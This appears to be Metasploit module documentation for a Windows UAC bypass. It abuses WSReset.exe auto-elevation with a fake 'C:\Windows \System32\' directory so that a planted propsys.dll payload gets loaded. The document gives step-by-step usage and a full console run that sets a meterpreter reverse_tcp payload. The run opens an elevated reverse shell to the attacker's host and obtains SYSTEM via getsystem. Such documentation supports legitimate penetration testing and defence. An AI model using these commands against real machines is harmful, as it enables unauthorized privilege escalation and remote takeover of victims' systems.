## Intro

This module exploits a flaw in the WSReset.exe Windows Store Reset Tool. The tool
is run with the "autoElevate" property set to true, however it can be moved to
a new Windows directory containing a space (C:\Windows \System32\) where, upon
execution, it will load our payload dll (propsys.dll).

## Usage

1. Create a session on the target system under the context of a local administrative user.
1. Begin interacting with the module: `use exploit/windows/local/bypassuac_windows_store_filesys`.
1. Set the `PAYLOAD` and configure it correctly, making sure the architecture is correct.
1. If an existing handler is configured to receive the elevated session, then the module's
   handler should be disabled: `set DisablePayloadHandler true`.
1. Make sure that the `SESSION` value is set to the existing session identifier.
1. Invoke the module: `run`.

## Scenario

### Windows 10.0.17134.885 x64

```
msf5 exploit(multi/handler) > use exploit/windows/local/bypassuac_windows_store_filesys
msf5 exploit(windows/local/bypassuac_windows_store_filesys) > set SESSION 1
SESSION => 1
msf5 exploit(windows/local/bypassuac_windows_store_filesys) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/local/bypassuac_windows_store_filesys) > set LPORT 5555
LPORT => 5555
msf5 exploit(windows/local/bypassuac_windows_store_filesys) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
msf5 exploit(windows/local/bypassuac_windows_store_filesys) > run

[*] Started reverse TCP handler on 192.168.56.1:5555
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Creating directory 'C:\Windows \'...
[*] Creating directory 'C:\Windows \System32\'...
[*] Creating payload 'C:\Windows \System32\propsys.dll'...
[*] Executing WSReset.exe...
[!] This exploit requires manual cleanup of the 'C:\Windows \' and 'C:\Windows \System32\' directories!
[*] Sending stage (206403 bytes) to 192.168.56.3
[*] Meterpreter session 2 opened (192.168.56.1:5555 -> 192.168.56.3:49803) at 2019-08-24 13:20:11 +0800

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter >
```
